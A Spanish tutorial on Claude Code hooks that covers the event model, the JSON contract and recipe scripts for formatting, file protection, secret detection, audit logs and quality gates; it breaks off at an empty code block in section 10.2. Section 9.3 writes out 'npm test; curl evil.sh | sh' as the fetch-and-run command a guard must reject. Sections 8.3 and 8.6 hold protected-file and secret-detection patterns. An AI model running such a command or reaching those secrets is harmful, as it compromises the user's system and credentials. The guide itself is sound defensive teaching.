# ⚡ Hooks y automatizaciones basadas en eventos — De cero a experto

> Esta lectura es la **guía integral** de la sección: parte de *qué es un hook* y llega hasta **arquitecturas de automatización** completas, con scripts listos para usar, pruebas automatizadas de los propios hooks, depuración y un modelo de **seguridad** para usarlos en equipos.
>
> **Idea central:** Claude Code es un sistema **orientado a eventos**. Cada cosa que hace (iniciar sesión, leer tu prompt, ejecutar una herramienta, terminar un turno) emite un evento. Un hook es tu código **suscrito** a ese evento. Tú no le *pides* a Claude que haga algo: **el sistema lo hace por ti, siempre.**

Lecturas relacionadas de esta sección (complementan, no se repiten aquí en detalle):

- [Eventos y Hooks disponibles en Claude Code](./Eventos%20y%20Hooks%20disponibles%20en%20Claude%20Code.md) — catálogo de eventos, tipos de handler y exit codes.
- [Matchers y Variables de entorno en Hooks de Claude Code](./Matchers%20y%20Variables%20de%20entorno%20en%20Hooks%20de%20Claude%20Code.md) — qué filtra el matcher en cada evento y variables `$CLAUDE_*`.
- [Hooks de seguridad en Claude Code](../Seccion%206/Hooks%20de%20seguridad%20en%20Claude%20Code.md) (sección 6).

> [!NOTE]
> Los diagramas usan **Mermaid**, que se renderiza en GitHub y en VS Code (con la vista previa de Markdown o la extensión *Markdown Preview Mermaid Support*).

---

## 📑 Tabla de contenido

**Nivel 0 — Fundamentos**
1. [¿Por qué existen los hooks?](#1-por-qué-existen-los-hooks)
2. [Modelo mental: arquitectura orientada a eventos](#2-modelo-mental-arquitectura-orientada-a-eventos)
3. [Dónde viven los hooks: alcance y precedencia](#3-dónde-viven-los-hooks-alcance-y-precedencia)
4. [Tu primer hook, paso a paso](#4-tu-primer-hook-paso-a-paso)

**Nivel 1 — El contrato**
5. [Entrada: el JSON que recibe tu hook](#5-entrada-el-json-que-recibe-tu-hook)
6. [Salida: exit codes vs. JSON estructurado](#6-salida-exit-codes-vs-json-estructurado)
7. [Modelo de ejecución: paralelismo, timeouts y async](#7-modelo-de-ejecución-paralelismo-timeouts-y-async)

**Nivel 2 — Recetas prácticas**
8. [Recetario de automatizaciones](#8-recetario-de-automatizaciones)

**Nivel 3 — Avanzado**
9. [Patrones avanzados](#9-patrones-avanzados)
10. [Hooks escritos en Node.js (robustos y testeables)](#10-hooks-escritos-en-nodejs-robustos-y-testeables)

**Nivel 4 — Experto: calidad, seguridad y operación**
11. [Verificación y pruebas de hooks](#11-verificación-y-pruebas-de-hooks)
12. [Depuración y troubleshooting](#12-depuración-y-troubleshooting)
13. [Seguridad: modelo de amenazas y buenas prácticas](#13-seguridad-modelo-de-amenazas-y-buenas-prácticas)
14. [Rendimiento y diseño](#14-rendimiento-y-diseño)
15. [Proyecto integrador: un `.claude/` de equipo](#15-proyecto-integrador-un-claude-de-equipo)
16. [Ejercicios y checklist final](#16-ejercicios-y-checklist-final)
17. [Resumen](#17-resumen)

---

# Nivel 0 — Fundamentos

## 1. ¿Por qué existen los hooks?

Un LLM es **probabilístico**: si en `CLAUDE.md` escribes *"ejecuta prettier después de editar"*, lo hará **casi siempre**. Un hook lo hace **siempre**.

| Necesidad | `CLAUDE.md` / prompt | Hook |
|-----------|----------------------|------|
| Formatear código tras cada edición | 🟡 A veces se olvida | ✅ Garantizado |
| Impedir `git push --force` a `main` | 🟡 Puede "convencerse" de que es necesario | ✅ Bloqueado por código |
| Avisarte cuando Claude espera tu input | ❌ Imposible | ✅ Notificación de escritorio |
| Inyectar la rama y los últimos commits al iniciar | 🟡 Tiene que ejecutarlo él (gasta un turno) | ✅ Contexto listo desde el inicio |
| No dejar terminar si los tests fallan | 🟡 Puede declarar "listo" igualmente | ✅ El hook lo obliga a seguir |

> [!TIP]
> **Regla de oro:** si algo **debe** pasar siempre (o **no debe** pasar nunca), es un hook. Si es una preferencia o guía de estilo, es `CLAUDE.md`. Lo ideal es combinarlos: `CLAUDE.md` explica el *porqué*, el hook garantiza el *qué*.

---

## 2. Modelo mental: arquitectura orientada a eventos

Claude Code funciona como un **bus de eventos**. El ciclo de vida del agente emite eventos; el *motor de hooks* busca los hooks registrados para ese evento, filtra por *matcher*, los ejecuta y **combina sus decisiones** antes de continuar.

```mermaid
flowchart LR
    subgraph CC["Claude Code (agente)"]
        L["Ciclo de vida<br/>(sesión, prompt, herramientas, stop)"]
    end

    subgraph HE["Motor de hooks"]
        R["Registro de hooks<br/>(settings + plugins + skills)"]
        M{"¿Matcher<br/>coincide?"}
        X["Ejecución en paralelo"]
        D["Combinar decisiones<br/>(deny gana)"]
    end

    subgraph H["Tus handlers"]
        C["command<br/>(bash, node, pwsh)"]
        HT["http<br/>(webhook)"]
        P["prompt<br/>(LLM sí/no)"]
        A["agent<br/>(subagente con tools)"]
    end

    L -- "evento + JSON" --> R --> M
    M -- sí --> X
    M -- no --> L
    X --> C & HT & P & A
    C & HT & P & A -- "exit code / JSON" --> D
    D -- "continuar / bloquear / contexto extra" --> L
```

### Los tres verbos de un hook

Todo lo que un hook puede hacer se reduce a tres verbos:

| Verbo | Qué significa | Ejemplo |
|-------|---------------|---------|
| **Observar** | Leer el evento sin cambiar nada | Log de auditoría, métricas, notificaciones |
| **Decidir** | Permitir, bloquear, pedir confirmación, obligar a continuar | Bloquear `rm -rf`, no dejar terminar con tests rojos |
| **Enriquecer / transformar** | Añadir contexto para Claude o modificar la entrada de una herramienta | Inyectar `git status` al iniciar, reescribir `--force` por `--force-with-lease` |

### Ciclo de vida completo de un turno

```mermaid
sequenceDiagram
    autonumber
    actor U as Usuario
    participant CC as Claude Code
    participant HK as Hooks
    participant T as Herramienta

    U->>CC: Inicia sesión
    CC->>HK: SessionStart
    HK-->>CC: additionalContext (rama, TODOs...)
    U->>CC: Escribe prompt
    CC->>HK: UserPromptSubmit
    HK-->>CC: ok / block / contexto extra
    loop Por cada herramienta que Claude decide usar
        CC->>HK: PreToolUse (tool_name, tool_input)
        HK-->>CC: allow / deny / ask / updatedInput
        alt permitido
            CC->>T: Ejecuta
            T-->>CC: Resultado
            CC->>HK: PostToolUse / PostToolUseFailure
            HK-->>CC: contexto / feedback a Claude
        else denegado
            CC-->>CC: Claude recibe el motivo y replantea
        end
    end
    CC->>HK: Stop
    HK-->>CC: ok (termina) / block (sigue trabajando)
    CC-->>U: Respuesta final
```

---

## 3. Dónde viven los hooks: alcance y precedencia

| Ubicación | Alcance | ¿Se versiona en git? | Uso recomendado |
|-----------|---------|:--------------------:|-----------------|
| `~/.claude/settings.json` | Todos tus proyectos | No | Notificaciones, preferencias personales |
| `.claude/settings.json` | El proyecto (todo el equipo) | **Sí** | Formateo, guardas de seguridad, quality gates |
| `.claude/settings.local.json` | El proyecto, solo tú | No (gitignored) | Experimentos, rutas locales |
| *Managed settings* (política de la organización) | Toda la máquina / empresa | Lo gestiona TI | Políticas obligatorias de seguridad |
| Plugins (`hooks/hooks.json`) | Mientras el plugin esté activo | Con el plugin | Automatizaciones distribuibles |
| Frontmatter de *skills* y *subagentes* | Solo mientras esa skill/agente está activo | Sí | Validaciones específicas de una tarea |

```mermaid
flowchart TB
    MS["🏢 Managed settings<br/>(organización)"] --> MERGE
    US["👤 ~/.claude/settings.json"] --> MERGE
    PS["📁 .claude/settings.json"] --> MERGE
    LS["🔒 .claude/settings.local.json"] --> MERGE
    PL["🧩 Plugins / skills / agentes"] --> MERGE
    MERGE(("Se SUMAN<br/>todos los hooks")) --> RUN["Se ejecutan todos los<br/>que coincidan con el evento"]
```

> [!IMPORTANT]
> Los hooks **no se sobrescriben entre niveles: se acumulan**. Si tu `settings.json` de usuario y el del proyecto tienen un hook de `PreToolUse` para `Bash`, **se ejecutan ambos**. Comandos idénticos se deduplican.

Claves de control global útiles:

```json
{
  "disableAllHooks": true
}
```

- `disableAllHooks`: desactiva todos los hooks (útil para aislar un problema).
- `allowManagedHooksOnly` (solo en *managed settings*): la organización impide que usuarios o proyectos añadan hooks propios; solo corren los de la política corporativa.

---

## 4. Tu primer hook, paso a paso

**Objetivo:** registrar en un archivo cada comando Bash que ejecute Claude.

### Paso 1 — Escribe el script

```bash
#!/usr/bin/env bash
# .claude/hooks/log-bash.sh
# Lee el JSON del evento por stdin y guarda el comando ejecutado.
entrada=$(cat)
comando=$(echo "$entrada" | jq -r '.tool_input.command // empty')
echo "$(date -Iseconds) | $comando" >> "$CLAUDE_PROJECT_DIR/.claude/bash.log"
exit 0
```

### Paso 2 — Regístralo

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/log-bash.sh\""
          }
        ]
      }
    ]
  }
}
```

### Paso 3 — Pruébalo **sin Claude** (siempre antes de activarlo)

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
  | CLAUDE_PROJECT_DIR="$PWD" bash .claude/hooks/log-bash.sh
echo "exit: $?"
cat .claude/bash.log
```

### Paso 4 — Verifica dentro de Claude Code

1. Ejecuta `/hooks` y confirma que aparece bajo `PreToolUse → Bash`.
2. Pide a Claude: *"lista los archivos del directorio"*.
3. Revisa `.claude/bash.log`.

> [!TIP]
> En Windows, Claude Code ejecuta los hooks `command` con **Git Bash**, por lo que los scripts `.sh` funcionan. Si prefieres PowerShell, invócalo explícitamente: `"command": "powershell -NoProfile -ExecutionPolicy Bypass -File \"$CLAUDE_PROJECT_DIR/.claude/hooks/mi-hook.ps1\""`. Y asegúrate de tener `jq` instalado (`winget install jqlang.jq`) o usa Node.js para parsear JSON.

---

# Nivel 1 — El contrato

Un hook es una **función pura con efectos secundarios controlados**: recibe un JSON, devuelve un resultado. Dominar este contrato es dominar los hooks.

```mermaid
flowchart LR
    IN["stdin<br/>JSON del evento"] --> HOOK["Tu hook"]
    HOOK --> EC["exit code<br/>0 · 2 · otro"]
    HOOK --> SO["stdout<br/>JSON de control<br/>o contexto"]
    HOOK --> SE["stderr<br/>motivo del bloqueo<br/>o log de error"]
```

## 5. Entrada: el JSON que recibe tu hook

### Campos comunes (todos los eventos)

```json
{
  "session_id": "abc123",
  "transcript_path": "/home/user/.claude/projects/.../abc123.jsonl",
  "cwd": "/home/user/mi-proyecto",
  "permission_mode": "default",
  "hook_event_name": "PreToolUse"
}
```

| Campo | Para qué te sirve |
|-------|-------------------|
| `session_id` | Correlacionar logs de una misma sesión |
| `transcript_path` | Leer la conversación completa (JSONL) — p. ej. para resúmenes al terminar |
| `cwd` | Directorio actual de trabajo |
| `permission_mode` | Ajustar la severidad: ser más estricto si está en `bypassPermissions` o `acceptEdits` |
| `hook_event_name` | Reutilizar **un solo script** para varios eventos |

### Campos específicos por evento (los más usados)

| Evento | Campos adicionales |
|--------|--------------------|
| `PreToolUse` | `tool_name`, `tool_input`, `tool_use_id` |
| `PostToolUse` | `tool_name`, `tool_input`, `tool_response`, `tool_use_id` |
| `UserPromptSubmit` | `prompt` |
| `Stop` / `SubagentStop` | `stop_hook_active` (⚠️ clave para evitar bucles) |
| `SessionStart` | `source` (`startup`, `resume`, `clear`, `compact`) |
| `Notification` | `message`, tipo de notificación |
| `PreCompact` | `trigger` (`manual` / `auto`), `custom_instructions` |

### `tool_input` según la herramienta

| Herramienta | Campos clave en `tool_input` |
|-------------|------------------------------|
| `Bash` | `command`, `description`, `timeout` |
| `Write` | `file_path`, `content` |
| `Edit` | `file_path`, `old_string`, `new_string`, `replace_all` |
| `Read` | `file_path`, `offset`, `limit` |
| `WebFetch` | `url`, `prompt` |
| `mcp__servidor__tool` | Los argumentos definidos por el servidor MCP |

> [!TIP]
> ¿No sabes qué llega exactamente? Crea un hook "espía" temporal que vuelque la entrada a un archivo:
> ```json
> { "type": "command", "command": "cat >> /tmp/hook-input.jsonl; echo >> /tmp/hook-input.jsonl" }
> ```
> Es la forma más rápida de descubrir la forma real del JSON en tu versión de Claude Code.

---

## 6. Salida: exit codes vs. JSON estructurado

Hay **dos formas** de responder. Elige una por hook, no las mezcles.

### Forma 1 — Exit codes (simple)

| Exit | Efecto |
|:----:|--------|
| `0` | Éxito. En `SessionStart` y `UserPromptSubmit`, el `stdout` se añade como contexto para Claude. |
| `2` | **Bloqueo**. El `stderr` se envía a Claude (o al usuario, según el evento). |
| otro | Error **no bloqueante**: se registra y la ejecución continúa. |

### Forma 2 — JSON en stdout con `exit 0` (control fino)

**Campos comunes a cualquier evento:**

```json
{
  "continue": true,
  "stopReason": "Mensaje al usuario si continue=false",
  "suppressOutput": false,
  "systemMessage": "Aviso que ve el usuario"
}
```

| Campo | Efecto |
|-------|--------|
| `continue: false` | Detiene **todo** el procesamiento de Claude (más fuerte que bloquear una herramienta) |
| `stopReason` | Mensaje que ve el usuario cuando `continue` es `false` |
| `suppressOutput` | Oculta el stdout del hook en el transcript |
| `systemMessage` | Muestra una advertencia al usuario |

**Campos de decisión por evento:**

| Evento | Cómo decide | Ejemplo |
|--------|-------------|---------|
| `PreToolUse` | `hookSpecificOutput.permissionDecision`: `allow` · `deny` · `ask` (+ `permissionDecisionReason`, `updatedInput`, `additionalContext`) | Bloquear, auto-aprobar, reescribir comando |
| `PermissionRequest` | `hookSpecificOutput.decision.behavior`: `allow` · `deny` (+ `updatedInput`, `message`) | Auto-aprobar `npm test` |
| `PostToolUse` | `decision: "block"` + `reason` (Claude recibe el motivo) · `hookSpecificOutput.additionalContext` | "El lint falló en la línea 12, corrígelo" |
| `UserPromptSubmit` | `decision: "block"` + `reason` · `hookSpecificOutput.additionalContext` | Rechazar prompts con secretos |
| `Stop` / `SubagentStop` | `decision: "block"` + `reason` (**obligatorio**: le dice qué falta) | "Faltan los tests de `UserService`" |
| `SessionStart` | `hookSpecificOutput.additionalContext` | Inyectar estado del repo |

Ejemplo de `PreToolUse` con todas las piezas:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "ask",
    "permissionDecisionReason": "Se cambió --force por --force-with-lease por seguridad.",
    "updatedInput": { "command": "git push --force-with-lease origin feature/x" }
  }
}
```

### Árbol de decisión: ¿qué devuelvo?

```mermaid
flowchart TD
    S([Mi hook terminó de evaluar]) --> Q1{¿Hay que impedir algo?}
    Q1 -- No --> Q2{¿Aporto contexto a Claude?}
    Q2 -- No --> E0["exit 0<br/>stdout vacío"]
    Q2 -- Sí --> CTX["exit 0 + JSON<br/>additionalContext"]
    Q1 -- Sí --> Q3{¿Necesito matices?<br/>ask / reescribir / mensaje al usuario}
    Q3 -- No --> E2["exit 2<br/>motivo en stderr"]
    Q3 -- Sí --> JS["exit 0 + JSON<br/>permissionDecision / decision"]
```

> [!WARNING]
> Con `exit 0`, el `stdout` **debe ser JSON válido o estar vacío** (salvo en los eventos que lo usan como contexto). Un `echo "debug..."` olvidado puede romper el parseo. Los mensajes de depuración van a **stderr** (`>&2`).

---

## 7. Modelo de ejecución: paralelismo, timeouts y async

| Aspecto | Comportamiento |
|---------|----------------|
| **Paralelismo** | Todos los hooks que coinciden con un evento se ejecutan **en paralelo**. No asumas orden entre ellos. |
| **Deduplicación** | Comandos idénticos registrados en varios niveles se ejecutan una sola vez. |
| **Combinación** | Si varios hooks deciden, gana la decisión **más restrictiva** (`deny` > `ask` > `allow`). |
| **Timeout** | Configurable por hook con `"timeout"` (en segundos). Al vencer, el hook se cancela y se trata como error no bloqueante. |
| **Async** | Los hooks `command` aceptan `"async": true`: corren en segundo plano y **no pueden bloquear**. Ideales para logging/notificaciones. |
| **Snapshot** | La configuración de hooks se captura al iniciar la sesión. Si alguien edita el archivo a mitad de sesión, Claude Code avisa y exige revisarlo en `/hooks` antes de aplicarlo. |

```json
{
  "type": "command",
  "command": "node \"$CLAUDE_PROJECT_DIR/.claude/hooks/auditoria.mjs\"",
  "timeout": 10,
  "async": true,
  "statusMessage": "Registrando auditoría..."
}
```

> [!CAUTION]
> Como los hooks corren **en paralelo**, dos hooks que editan el mismo archivo (p. ej. `prettier` y `eslint --fix`) pueden pisarse. Si el orden importa, **encadénalos en un solo script**.

---

# Nivel 2 — Recetas prácticas

## 8. Recetario de automatizaciones

Cada receta indica: **evento → matcher → objetivo**. Todas son copiables.

### 8.1 Formatear automáticamente al editar (Node / C#)

**`PostToolUse` → `Edit|Write` → código siempre formateado.**

```bash
#!/usr/bin/env bash
# .claude/hooks/formatear.sh
archivo=$(jq -r '.tool_input.file_path // empty')
[ -z "$archivo" ] && exit 0

case "$archivo" in
  *.js|*.mjs|*.ts|*.tsx|*.json|*.css|*.md)
    npx --no-install prettier --write "$archivo" >/dev/null 2>&1 ;;
  *.cs)
    # dotnet format sobre la solución, restringido al archivo editado
    dotnet format --include "$archivo" >/dev/null 2>&1 ;;
esac
exit 0   # formatear nunca debe bloquear
```

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/formatear.sh\"", "timeout": 30 }
        ]
      }
    ]
  }
}
```

### 8.2 Lint con feedback a Claude

**`PostToolUse` → `Edit|Write` → si el lint falla, Claude lo sabe y lo corrige.**

```bash
#!/usr/bin/env bash
# .claude/hooks/lint-feedback.sh
archivo=$(jq -r '.tool_input.file_path // empty')
[[ "$archivo" =~ \.(js|ts|mjs)$ ]] || exit 0

if ! salida=$(npx --no-install eslint "$archivo" 2>&1); then
  jq -n --arg r "ESLint encontró problemas en $archivo:"$'\n'"$salida" \
    '{decision: "block", reason: $r}'
fi
exit 0
```

> En `PostToolUse` el `"block"` **no deshace** la edición: le entrega el `reason` a Claude para que actúe.

### 8.3 Proteger archivos sensibles

**`PreToolUse` → `Edit|Write|Read` → nadie toca `.env`, llaves ni lockfiles.**

```bash
#!/usr/bin/env bash
# .claude/hooks/proteger-archivos.sh
# Guarda de seguridad → FAIL-CLOSED: si falta jq o el JSON es inválido, se bloquea.
command -v jq >/dev/null || { echo "proteger-archivos: jq no está instalado (bloqueo preventivo)" >&2; exit 2; }
archivo=$(jq -r '.tool_input.file_path // empty') || { echo "proteger-archivos: JSON de entrada inválido" >&2; exit 2; }
[ -z "$archivo" ] && exit 0

protegidos=('.env' '.env.*' '*.pem' '*.key' 'appsettings.Production.json' 'package-lock.json' '.git/*')
nombre=$(basename "$archivo")

for patron in "${protegidos[@]}"; do
  # El patrón va SIN comillas a propósito: así * funciona como comodín (con comillas sería literal)
  # shellcheck disable=SC2053
  if [[ "$nombre" == $patron || "$archivo" == */$patron ]]; then
    echo "Archivo protegido por política del proyecto: $archivo" >&2
    exit 2
  fi
done
exit 0
```

### 8.4 Notificación de escritorio cuando Claude te necesita

**`Notification` → (sin matcher) → no estar pendiente de la terminal.**

```json
{
  "hooks": {
    "Notification": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "powershell -NoProfile -Command \"Add-Type -AssemblyName System.Windows.Forms; $n = New-Object System.Windows.Forms.NotifyIcon; $n.Icon = [System.Drawing.SystemIcons]::Information; $n.Visible = $true; $n.ShowBalloonTip(5000, 'Claude Code', 'Claude necesita tu atención', 'Info'); Start-Sleep 6; $n.Dispose()\"",
            "async": true
          }
        ]
      }
    ]
  }
}
```

| SO | Comando equivalente |
|----|---------------------|
| macOS | `osascript -e 'display notification "Claude necesita tu atención" with title "Claude Code"'` |
| Linux | `notify-send 'Claude Code' 'Claude necesita tu atención'` |

### 8.5 Contexto automático al iniciar la sesión

**`SessionStart` → `startup|resume` → Claude arranca sabiendo el estado del repo.**

```bash
#!/usr/bin/env bash
# .claude/hooks/contexto-inicial.sh
cd "$CLAUDE_PROJECT_DIR" || exit 0
echo "## Estado del repositorio"
echo "- Rama actual: $(git branch --show-current 2>/dev/null)"
echo "- Cambios sin commit: $(git status --porcelain 2>/dev/null | wc -l)"
echo "### Últimos 5 commits"
git log --oneline -5 2>/dev/null
if [ -f TODO.md ]; then
  echo "### TODO pendiente"
  head -20 TODO.md
fi
exit 0
```

> En `SessionStart`, el `stdout` con `exit 0` se convierte en **contexto para Claude**. Mantenlo corto: todo lo que imprimas consume tokens en cada sesión.

### 8.6 Bloquear secretos en los prompts

**`UserPromptSubmit` → evitar pegar credenciales por accidente.**

```bash
#!/usr/bin/env bash
# .claude/hooks/detectar-secretos-prompt.sh
prompt=$(jq -r '.prompt // empty')

patrones='(AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9_-]{20,}|Password=[^;]+;)'

if echo "$prompt" | grep -qE "$patrones"; then
  jq -n '{decision: "block", reason: "El prompt parece contener un secreto (API key, llave privada o cadena de conexión). Elimínalo y usa variables de entorno."}'
fi
exit 0
```

### 8.7 Auditoría de todo lo que hace Claude (JSONL)

**`PostToolUse` → `*` → trazabilidad completa, sin frenar nada.**

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "jq -c '{ts: (now|todate), sesion: .session_id, tool: .tool_name, input: .tool_input}' >> \"$CLAUDE_PROJECT_DIR/.claude/auditoria.jsonl\"",
            "async": true
          }
        ]
      }
    ]
  }
}
```

Consultas útiles sobre el log:

```bash
# ¿Qué herramientas usa más Claude?
jq -r '.tool' .claude/auditoria.jsonl | sort | uniq -c | sort -rn
# ¿Qué comandos Bash ejecutó hoy?
jq -r 'select(.tool=="Bash") | .input.command' .claude/auditoria.jsonl
```

---

# Nivel 3 — Avanzado

## 9. Patrones avanzados

### 9.1 Quality gate en `Stop`: no terminar con tests en rojo

Este es el patrón **más potente** de los hooks: convierte a Claude en un agente que **no se rinde** hasta cumplir un criterio verificable.

```mermaid
stateDiagram-v2
    [*] --> Trabajando
    Trabajando --> Stop: Claude cree que terminó
    Stop --> EvaluarHook
    EvaluarHook --> Terminado: stop_hook_active = true<br/>(ya se le insistió una vez)
    EvaluarHook --> Terminado: tests en verde
    EvaluarHook --> Trabajando: tests en rojo<br/>exit 2 + motivo
    Terminado --> [*]
```

```bash
#!/usr/bin/env bash
# .claude/hooks/quality-gate.sh
entrada=$(cat)

# 1) Anti-bucle: si ya bloqueamos una vez en esta cadena, dejar terminar.
if [ "$(echo "$entrada" | jq -r '.stop_hook_active')" = "true" ]; then
  exit 0
fi

cd "$CLAUDE_PROJECT_DIR" || exit 0

# 2) Solo validar si hubo cambios en el código
git diff --quiet HEAD -- src/ 2>/dev/null && exit 0

# 3) Ejecutar tests
if ! salida=$(npm test --silent 2>&1); then
  {
    echo "No puedes terminar: los tests fallan. Corrígelos y vuelve a ejecutarlos."
    echo "--- Últimas líneas de la salida ---"
    echo "$salida" | tail -n 40
  } >&2
  exit 2
fi
exit 0
```

> [!WARNING]
> Sin la comprobación de `stop_hook_active`, un test que Claude no sabe arreglar provoca un **bucle infinito** (y una factura de tokens considerable). Una alternativa más flexible es llevar un **contador de intentos** en un archivo temporal por `session_id` y permitir, por ejemplo, 3 reintentos.

Variante con contador:

```bash
contador="/tmp/claude-gate-$(echo "$entrada" | jq -r '.session_id')"
intentos=$(cat "$contador" 2>/dev/null || echo 0)
if [ "$intentos" -ge 3 ]; then rm -f "$contador"; exit 0; fi
# ... si fallan los tests:
echo $((intentos + 1)) > "$contador"
```

### 9.2 Reescribir la entrada de una herramienta (`updatedInput`)

En lugar de solo bloquear, **corrige** la intención: cambia `git push --force` por `--force-with-lease` y pide confirmación mostrando el comando nuevo.

```bash
#!/usr/bin/env bash
# .claude/hooks/push-seguro.sh
comando=$(jq -r '.tool_input.command // empty')

if [[ "$comando" =~ git[[:space:]]+push.*(--force|-f)([[:space:]]|$) && ! "$comando" =~ --force-with-lease ]]; then
  nuevo=$(echo "$comando" | sed -E 's/(--force|-f)([[:space:]]|$)/--force-with-lease\2/')
  jq -n --arg c "$nuevo" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "ask",
      permissionDecisionReason: "Se reemplazó --force por --force-with-lease.",
      updatedInput: { command: $c }
    }
  }'
fi
exit 0
```

> [!CAUTION]
> `updatedInput` + `permissionDecision: "allow"` **ejecuta sin preguntarte**. Usa `"ask"` siempre que la reescritura cambie el significado del comando.

### 9.3 Auto-aprobar permisos seguros (`PermissionRequest`)

Reduce la fatiga de aprobaciones para comandos de solo lectura o de test:

```bash
#!/usr/bin/env bash
# .claude/hooks/auto-aprobar.sh
comando=$(jq -r '.tool_input.command // empty')

seguros='^(npm (test|run lint)|dotnet (build|test)|git (status|diff|log))( |$)'
peligrosos='[;&|`$<>]'   # encadenamiento, sustitución y redirección

if [[ $comando =~ $seguros ]] && [[ ! $comando =~ $peligrosos ]]; then
  jq -n '{hookSpecificOutput: {hookEventName: "PermissionRequest", decision: {behavior: "allow"}}}'
fi
exit 0
```

> Fíjate en la segunda condición: **rechaza metacaracteres de shell**. Sin ella, `npm test; curl evil.sh | sh` pasaría la primera regex. Más en [Seguridad](#13-seguridad-modelo-de-amenazas-y-buenas-prácticas).

### 9.4 Hooks con juicio semántico: `prompt` y `agent`

Cuando una regex no alcanza, delega la decisión a un modelo.

**`prompt`** — una sola llamada, respuesta sí/no:

```json
{
  "hooks": {
    "Stop": [
      {
        "hooks": [
          {
            "type": "prompt",
            "prompt": "Evalúa si Claude completó TODO lo que pidió el usuario y no dejó TODOs ni código comentado. Contexto: $ARGUMENTS. Responde {\"ok\": true} si está completo o {\"ok\": false, \"reason\": \"qué falta\"}.",
            "timeout": 30
          }
        ]
      }
    ]
  }
}
```

**`agent`** — un subagente que puede usar `Read`, `Grep`, `Glob` para verificar:

```json
{
  "type": "agent",
  "prompt": "Revisa los archivos .cs modificados en esta sesión ($ARGUMENTS). Verifica que cada clase pública nueva tenga al menos un test en el proyecto *.Tests. Si falta alguno, responde ok=false indicando cuáles.",
  "timeout": 120
}
```

| Criterio | `command` | `prompt` | `agent` |
|----------|:---------:|:--------:|:-------:|
| Velocidad | ⚡ ms | 🐢 segundos | 🐌 decenas de segundos |
| Costo en tokens | 0 | Bajo | Medio-alto |
| Determinismo | ✅ Total | 🟡 Parcial | 🟡 Parcial |
| Puede inspeccionar archivos | Sí (tú lo programas) | No | ✅ Sí, con herramientas |
| Ideal para | Reglas claras | Juicios de calidad | Verificaciones que requieren investigar |

### 9.5 Sobrevivir a la compactación de contexto

Cuando el contexto se compacta, Claude puede "olvidar" reglas críticas de la sesión. Patrón: **guardar antes, re-inyectar después.**

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "compact",
        "hooks": [
          { "type": "command", "command": "cat \"$CLAUDE_PROJECT_DIR/.claude/contexto-critico.md\"" }
        ]
      }
    ]
  }
}
```

`contexto-critico.md` puede contener: la tarea en curso, decisiones de arquitectura tomadas, restricciones ("no tocar el módulo de facturación").

### 9.6 Hooks para herramientas MCP

Los matchers aceptan regex sobre `mcp__<servidor>__<herramienta>`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "mcp__github__(merge_pull_request|delete_.*)",
        "hooks": [
          { "type": "command", "command": "echo 'Operaciones destructivas de GitHub requieren hacerse manualmente.' >&2; exit 2" }
        ]
      },
      {
        "matcher": "mcp__.*__.*(write|execute|query).*",
        "hooks": [
          { "type": "command", "command": "node \"$CLAUDE_PROJECT_DIR/.claude/hooks/auditar-mcp.mjs\"", "async": true }
        ]
      }
    ]
  }
}
```

### 9.7 Hooks HTTP: centralizar políticas en un servicio

```json
{
  "type": "http",
  "url": "https://politicas.miempresa.local/claude/pre-tool",
  "timeout": 5,
  "headers": { "Authorization": "Bearer $POLITICAS_TOKEN" },
  "allowedEnvVars": ["POLITICAS_TOKEN"]
}
```

- El cuerpo del POST es el mismo JSON que recibiría un hook `command`.
- El servicio responde con el **mismo JSON de salida** (`hookSpecificOutput`, `decision`...).
- Una respuesta no-2xx o un timeout es un **error no bloqueante** → si el servicio cae, **no bloquea** (fail-open). Tenlo en cuenta en el diseño.
- Solo se interpolan en headers las variables listadas en `allowedEnvVars` (evita filtrar secretos por accidente).

Servidor mínimo en Node.js 22:

```js
// politicas-server.mjs
import { createServer } from 'node:http';

const leerCuerpo = async (req) => {
  const partes = [];
  for await (const parte of req) partes.push(parte);
  return JSON.parse(Buffer.concat(partes).toString('utf8'));
};

const evaluar = ({ tool_name: tool, tool_input: input = {} }) => {
  if (tool === 'Bash' && /\b(drop|truncate)\s+table\b/i.test(input.command ?? '')) {
    return { permissionDecision: 'deny', permissionDecisionReason: 'DDL destructivo bloqueado por política corporativa.' };
  }
  return null;
};

createServer(async (req, res) => {
  try {
    const evento = await leerCuerpo(req);
    const decision = evaluar(evento);
    const cuerpo = decision ? { hookSpecificOutput: { hookEventName: 'PreToolUse', ...decision } } : {};
    res.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify(cuerpo));
  } catch (error) {
    res.writeHead(400).end(String(error));
  }
}).listen(8787);
```

### 9.8 Hooks dentro de skills y subagentes

Las *skills* y los *subagentes* pueden declarar hooks en su frontmatter. Solo están activos mientras esa skill o agente está en uso:

```markdown
---
name: migraciones-sql
description: Crea y revisa migraciones de base de datos
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "bash ./scripts/validar-sql-seguro.sh"
---
Instrucciones de la skill...
```

Esto permite **políticas contextuales**: reglas estrictas de SQL solo cuando se trabaja en migraciones, sin penalizar el resto de la sesión.

---

## 10. Hooks escritos en Node.js (robustos y testeables)

Bash + `jq` es ideal para hooks cortos. Cuando la lógica crece, **Node.js** ofrece parseo JSON nativo, mejor manejo de errores, multiplataforma real (Windows sin depender de `jq`) y **tests unitarios**.

### 10.1 Estructura recomendada

```
.claude/
├── settings.json
└── hooks/
    ├── lib/
    │   └── hook-io.mjs          # utilidades compartidas (leer stdin, responder)
    ├── guardian-bash.mjs        # PreToolUse(Bash)
    ├── escaner-secretos.mjs     # PreToolUse(Write|Edit)
    └── __tests__/
        └── guardian-bash.test.mjs
```

### 10.2 Librería compartida

```js
